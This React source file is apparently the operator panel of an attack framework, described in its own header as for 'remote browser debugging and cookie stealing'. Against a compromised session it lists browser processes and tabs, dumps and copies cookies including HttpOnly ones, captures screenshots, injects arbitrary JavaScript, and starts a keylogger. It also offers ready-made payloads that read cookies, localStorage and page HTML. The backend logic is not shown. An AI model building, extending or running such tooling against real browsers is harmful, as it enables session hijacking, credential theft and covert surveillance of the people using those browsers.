import { useState } from 'react';
import { useQuery, useMutation } from '@tanstack/react-query';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { ScrollArea } from '@/components/ui/scroll-area';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Textarea } from '@/components/ui/textarea';
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from '@/components/ui/dialog';
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table';
import {
  Chrome,
  Globe,
  Cookie,
  Camera,
  Code,
  Keyboard,
  RefreshCw,
  Loader2,
  Play,
  Copy,
  AlertTriangle,
} from 'lucide-react';
import api from '@/lib/api';
import { toast } from 'sonner';
import type { CursedProcess, CursedWindow, CursedCookie } from '@/types';

interface CursedPanelProps {
  sessionId: string;
}

export function CursedPanel({ sessionId }: CursedPanelProps) {
  const [selectedProcess, setSelectedProcess] = useState<CursedProcess | null>(null);
  const [selectedWindow, setSelectedWindow] = useState<CursedWindow | null>(null);
  const [showInjectDialog, setShowInjectDialog] = useState(false);
  const [injectScript, setInjectScript] = useState('');
  const [cookieFilter, setCookieFilter] = useState('');
  const [screenshotData, setScreenshotData] = useState<string | null>(null);
  const [keyloggerEnabled, setKeyloggerEnabled] = useState(false);

  // Fetch browser processes
  const { data: processesData, isLoading: processesLoading, refetch: refetchProcesses } = useQuery({
    queryKey: ['cursed-processes', sessionId],
    queryFn: () => api.cursedListProcesses(sessionId),
  });

  // Fetch Chrome data when a process is selected
  const { data: chromeData, isLoading: chromeLoading, refetch: refetchChrome } = useQuery({
    queryKey: ['cursed-chrome', sessionId, selectedProcess?.pid],
    queryFn: () => selectedProcess ? api.cursedGetChrome(sessionId, selectedProcess.pid) : Promise.resolve(null),
    enabled: !!selectedProcess,
  });

  // Fetch cookies
  const { data: cookiesData, isLoading: cookiesLoading, refetch: refetchCookies } = useQuery({
    queryKey: ['cursed-cookies', sessionId, selectedProcess?.pid, cookieFilter],
    queryFn: () => selectedProcess ? api.cursedGetCookies(sessionId, selectedProcess.pid, cookieFilter || undefined) : Promise.resolve(null),
    enabled: !!selectedProcess,
  });

  // Screenshot mutation
  const screenshotMutation = useMutation({
    mutationFn: (windowId: string) => {
      if (!selectedProcess) throw new Error('No process selected');
      return api.cursedScreenshot(sessionId, selectedProcess.pid, windowId);
    },
    onSuccess: (data) => {
      setScreenshotData(data.data);
      toast.success('Screenshot captured');
    },
    onError: (error: Error) => {
      toast.error(`Screenshot failed: ${error.message}`);
    },
  });

  // Inject JS mutation
  const injectMutation = useMutation({
    mutationFn: ({ windowId, script }: { windowId: string; script: string }) => {
      if (!selectedProcess) throw new Error('No process selected');
      return api.cursedInjectJS(sessionId, selectedProcess.pid, { windowId, script });
    },
    onSuccess: (data) => {
      toast.success('Script injected');
      if (data.result) {
        toast.info(`Result: ${data.result.slice(0, 100)}...`);
      }
    },
    onError: (error: Error) => {
      toast.error(`Injection failed: ${error.message}`);
    },
  });

  // Keylogger mutation
  const keyloggerMutation = useMutation({
    mutationFn: ({ windowId, enabled }: { windowId: string; enabled: boolean }) => {
      if (!selectedProcess) throw new Error('No process selected');
      return api.cursedKeylogger(sessionId, selectedProcess.pid, { windowId, enabled });
    },
    onSuccess: (_, variables) => {
      setKeyloggerEnabled(variables.enabled);
      toast.success(variables.enabled ? 'Keylogger started' : 'Keylogger stopped');
    },
    onError: (error: Error) => {
      toast.error(`Keylogger error: ${error.message}`);
    },
  });

  const handleCopyCookie = (cookie: CursedCookie) => {
    navigator.clipboard.writeText(`${cookie.name}=${cookie.value}`);
    toast.success('Cookie copied to clipboard');
  };

  const handleInject = () => {
    if (selectedWindow && injectScript) {
      injectMutation.mutate({ windowId: selectedWindow.id, script: injectScript });
      setShowInjectDialog(false);
      setInjectScript('');
    }
  };

  const processes = processesData?.processes || [];
  const windows = chromeData?.windows || [];
  const cookies = cookiesData?.cookies || [];

  return (
    <div className="flex flex-col h-full">
      {/* Header */}
      <div className="flex items-center justify-between p-4 border-b">
        <div className="flex items-center gap-2">
          <Chrome className="h-5 w-5 text-yellow-500" />
          <div>
            <h2 className="text-lg font-semibold">Cursed - Browser Manipulation</h2>
            <p className="text-sm text-muted-foreground">
              Remote browser debugging and cookie stealing
            </p>
          </div>
        </div>
        <Button
          variant="outline"
          size="sm"
          onClick={() => refetchProcesses()}
          disabled={processesLoading}
        >
          {processesLoading ? (
            <Loader2 className="h-4 w-4 animate-spin" />
          ) : (
            <RefreshCw className="h-4 w-4" />
          )}
          <span className="ml-2">Scan</span>
        </Button>
      </div>

      <div className="flex-1 flex overflow-hidden">
        {/* Process List */}
        <div className="w-64 border-r flex flex-col">
          <div className="p-3 border-b bg-muted/50">
            <h3 className="text-sm font-medium">Browser Processes</h3>
          </div>
          <ScrollArea className="flex-1">
            {processesLoading ? (
              <div className="p-4 text-center">
                <Loader2 className="h-6 w-6 animate-spin mx-auto text-muted-foreground" />
              </div>
            ) : processes.length === 0 ? (
              <div className="p-4 text-center text-muted-foreground text-sm">
                <AlertTriangle className="h-8 w-8 mx-auto mb-2 opacity-50" />
                No browser processes found
              </div>
            ) : (
              <div className="p-2 space-y-1">
                {processes.map((process) => (
                  <button
                    key={process.pid}
                    onClick={() => {
                      setSelectedProcess(process);
                      setSelectedWindow(null);
                    }}
                    className={`w-full text-left p-2 rounded-md text-sm transition-colors ${
                      selectedProcess?.pid === process.pid
                        ? 'bg-yellow-500/20 text-yellow-600 dark:text-yellow-400'
                        : 'hover:bg-muted'
                    }`}
                  >
                    <div className="flex items-center gap-2">
                      <Chrome className="h-4 w-4" />
                      <span className="truncate">{process.name}</span>
                    </div>
                    <div className="text-xs text-muted-foreground mt-1">
                      PID: {process.pid}
                    </div>
                  </button>
                ))}
              </div>
            )}
          </ScrollArea>
        </div>

        {/* Main Content */}
        <div className="flex-1 flex flex-col overflow-hidden">
          {selectedProcess ? (
            <Tabs defaultValue="windows" className="flex-1 flex flex-col">
              <div className="border-b px-4">
                <TabsList className="h-10">
                  <TabsTrigger value="windows" className="gap-2">
                    <Globe className="h-4 w-4" />
                    Windows
                  </TabsTrigger>
                  <TabsTrigger value="cookies" className="gap-2">
                    <Cookie className="h-4 w-4" />
                    Cookies
                  </TabsTrigger>
                  <TabsTrigger value="screenshot" className="gap-2">
                    <Camera className="h-4 w-4" />
                    Screenshot
                  </TabsTrigger>
                </TabsList>
              </div>

              {/* Windows Tab */}
              <TabsContent value="windows" className="flex-1 m-0 overflow-hidden">
                <div className="flex h-full">
                  {/* Windows List */}
                  <div className="w-80 border-r flex flex-col">
                    <div className="p-3 border-b flex items-center justify-between">
                      <h4 className="text-sm font-medium">Browser Windows/Tabs</h4>
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => refetchChrome()}
                        disabled={chromeLoading}
                      >
                        <RefreshCw className={`h-3 w-3 ${chromeLoading ? 'animate-spin' : ''}`} />
                      </Button>
                    </div>
                    <ScrollArea className="flex-1">
                      {chromeLoading ? (
                        <div className="p-4 text-center">
                          <Loader2 className="h-6 w-6 animate-spin mx-auto" />
                        </div>
                      ) : windows.length === 0 ? (
                        <div className="p-4 text-center text-muted-foreground text-sm">
                          No windows found
                        </div>
                      ) : (
                        <div className="p-2 space-y-1">
                          {windows.map((win) => (
                            <button
                              key={win.id}
                              onClick={() => setSelectedWindow(win)}
                              className={`w-full text-left p-2 rounded-md text-sm transition-colors ${
                                selectedWindow?.id === win.id
                                  ? 'bg-yellow-500/20 text-yellow-600 dark:text-yellow-400'
                                  : 'hover:bg-muted'
                              }`}
                            >
                              <div className="flex items-center gap-2">
                                <Globe className="h-4 w-4 flex-shrink-0" />
                                <span className="truncate font-medium">{win.title || 'Untitled'}</span>
                              </div>
                              <div className="text-xs text-muted-foreground mt-1 truncate">
                                {win.url}
                              </div>
                              <Badge variant="outline" className="mt-1 text-xs">
                                {win.type}
                              </Badge>
                            </button>
                          ))}
                        </div>
                      )}
                    </ScrollArea>
                  </div>

                  {/* Window Actions */}
                  <div className="flex-1 p-4">
                    {selectedWindow ? (
                      <div className="space-y-4">
                        <Card>
                          <CardHeader>
                            <CardTitle className="text-base">{selectedWindow.title || 'Untitled'}</CardTitle>
                            <CardDescription className="truncate">
                              {selectedWindow.url}
                            </CardDescription>
                          </CardHeader>
                          <CardContent>
                            <div className="flex flex-wrap gap-2">
                              <Button
                                variant="outline"
                                size="sm"
                                onClick={() => screenshotMutation.mutate(selectedWindow.id)}
                                disabled={screenshotMutation.isPending}
                              >
                                {screenshotMutation.isPending ? (
                                  <Loader2 className="h-4 w-4 animate-spin mr-2" />
                                ) : (
                                  <Camera className="h-4 w-4 mr-2" />
                                )}
                                Screenshot
                              </Button>
                              <Button
                                variant="outline"
                                size="sm"
                                onClick={() => setShowInjectDialog(true)}
                              >
                                <Code className="h-4 w-4 mr-2" />
                                Inject JS
                              </Button>
                              <Button
                                variant={keyloggerEnabled ? 'destructive' : 'outline'}
                                size="sm"
                                onClick={() => keyloggerMutation.mutate({
                                  windowId: selectedWindow.id,
                                  enabled: !keyloggerEnabled,
                                })}
                                disabled={keyloggerMutation.isPending}
                              >
                                {keyloggerMutation.isPending ? (
                                  <Loader2 className="h-4 w-4 animate-spin mr-2" />
                                ) : (
                                  <Keyboard className="h-4 w-4 mr-2" />
                                )}
                                {keyloggerEnabled ? 'Stop Keylogger' : 'Start Keylogger'}
                              </Button>
                            </div>
                          </CardContent>
                        </Card>

                        {/* Common JS Payloads */}
                        <Card>
                          <CardHeader>
                            <CardTitle className="text-sm">Quick Payloads</CardTitle>
                          </CardHeader>
                          <CardContent className="space-y-2">
                            <Button
                              variant="ghost"
                              size="sm"
                              className="w-full justify-start text-xs"
                              onClick={() => {
                                setInjectScript('alert(document.cookie)');
                                setShowInjectDialog(true);
                              }}
                            >
                              <Play className="h-3 w-3 mr-2" />
                              Alert Cookies
                            </Button>
                            <Button
                              variant="ghost"
                              size="sm"
                              className="w-full justify-start text-xs"
                              onClick={() => {
                                setInjectScript('JSON.stringify(localStorage)');
                                setShowInjectDialog(true);
                              }}
                            >
                              <Play className="h-3 w-3 mr-2" />
                              Dump localStorage
                            </Button>
                            <Button
                              variant="ghost"
                              size="sm"
                              className="w-full justify-start text-xs"
                              onClick={() => {
                                setInjectScript('document.body.innerHTML');
                                setShowInjectDialog(true);
                              }}
                            >
                              <Play className="h-3 w-3 mr-2" />
                              Get Page HTML
                            </Button>
                          </CardContent>
                        </Card>
                      </div>
                    ) : (
                      <div className="h-full flex items-center justify-center text-muted-foreground">
                        Select a window to interact
                      </div>
                    )}
                  </div>
                </div>
              </TabsContent>

              {/* Cookies Tab */}
              <TabsContent value="cookies" className="flex-1 m-0 overflow-hidden flex flex-col">
                <div className="p-4 border-b flex items-center gap-4">
                  <div className="flex-1">
                    <Input
                      placeholder="Filter by URL (e.g., .google.com)"
                      value={cookieFilter}
                      onChange={(e) => setCookieFilter(e.target.value)}
                    />
                  </div>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => refetchCookies()}
                    disabled={cookiesLoading}
                  >
                    {cookiesLoading ? (
                      <Loader2 className="h-4 w-4 animate-spin" />
                    ) : (
                      <RefreshCw className="h-4 w-4" />
                    )}
                  </Button>
                </div>
                <ScrollArea className="flex-1">
                  {cookiesLoading ? (
                    <div className="p-8 text-center">
                      <Loader2 className="h-8 w-8 animate-spin mx-auto" />
                    </div>
                  ) : cookies.length === 0 ? (
                    <div className="p-8 text-center text-muted-foreground">
                      No cookies found
                    </div>
                  ) : (
                    <Table>
                      <TableHeader>
                        <TableRow>
                          <TableHead>Name</TableHead>
                          <TableHead>Domain</TableHead>
                          <TableHead>Value</TableHead>
                          <TableHead>Flags</TableHead>
                          <TableHead className="w-[80px]">Actions</TableHead>
                        </TableRow>
                      </TableHeader>
                      <TableBody>
                        {cookies.map((cookie, idx) => (
                          <TableRow key={`${cookie.domain}-${cookie.name}-${idx}`}>
                            <TableCell className="font-medium">{cookie.name}</TableCell>
                            <TableCell className="text-muted-foreground">{cookie.domain}</TableCell>
                            <TableCell className="max-w-[200px]">
                              <span className="truncate block text-xs font-mono">
                                {cookie.value.slice(0, 50)}...
                              </span>
                            </TableCell>
                            <TableCell>
                              <div className="flex gap-1 flex-wrap">
                                {cookie.httpOnly && (
                                  <Badge variant="secondary" className="text-xs">HttpOnly</Badge>
                                )}
                                {cookie.secure && (
                                  <Badge variant="secondary" className="text-xs">Secure</Badge>
                                )}
                              </div>
                            </TableCell>
                            <TableCell>
                              <Button
                                variant="ghost"
                                size="icon"
                                onClick={() => handleCopyCookie(cookie)}
                              >
                                <Copy className="h-4 w-4" />
                              </Button>
                            </TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  )}
                </ScrollArea>
              </TabsContent>

              {/* Screenshot Tab */}
              <TabsContent value="screenshot" className="flex-1 m-0 overflow-hidden p-4">
                {screenshotData ? (
                  <div className="h-full flex flex-col">
                    <div className="flex justify-end mb-2">
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() => {
                          const link = document.createElement('a');
                          link.href = `data:image/png;base64,${screenshotData}`;
                          link.download = 'screenshot.png';
                          link.click();
                        }}
                      >
                        Download
                      </Button>
                    </div>
                    <div className="flex-1 border rounded-lg overflow-hidden bg-muted">
                      <img
                        src={`data:image/png;base64,${screenshotData}`}
                        alt="Browser Screenshot"
                        className="w-full h-full object-contain"
                      />
                    </div>
                  </div>
                ) : (
                  <div className="h-full flex items-center justify-center text-muted-foreground">
                    <div className="text-center">
                      <Camera className="h-12 w-12 mx-auto mb-2 opacity-50" />
                      <p>Select a window and click Screenshot to capture</p>
                    </div>
                  </div>
                )}
              </TabsContent>
            </Tabs>
          ) : (
            <div className="flex-1 flex items-center justify-center text-muted-foreground">
              <div className="text-center">
                <Chrome className="h-12 w-12 mx-auto mb-4 opacity-50" />
                <p className="text-lg font-medium">Select a Browser Process</p>
                <p className="text-sm">Click Scan to find running browsers with debug ports</p>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Inject JS Dialog */}
      <Dialog open={showInjectDialog} onOpenChange={setShowInjectDialog}>
        <DialogContent className="max-w-2xl">
          <DialogHeader>
            <DialogTitle>Inject JavaScript</DialogTitle>
            <DialogDescription>
              Execute JavaScript code in the selected browser window
            </DialogDescription>
          </DialogHeader>
          <div className="space-y-4">
            <div className="space-y-2">
              <Label>JavaScript Code</Label>
              <Textarea
                value={injectScript}
                onChange={(e) => setInjectScript(e.target.value)}
                placeholder="// Enter JavaScript code to execute..."
                className="font-mono min-h-[200px]"
              />
            </div>
          </div>
          <DialogFooter>
            <Button variant="outline" onClick={() => setShowInjectDialog(false)}>
              Cancel
            </Button>
            <Button
              onClick={handleInject}
              disabled={!injectScript || injectMutation.isPending}
            >
              {injectMutation.isPending ? (
                <Loader2 className="h-4 w-4 animate-spin mr-2" />
              ) : (
                <Play className="h-4 w-4 mr-2" />
              )}
              Execute
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}
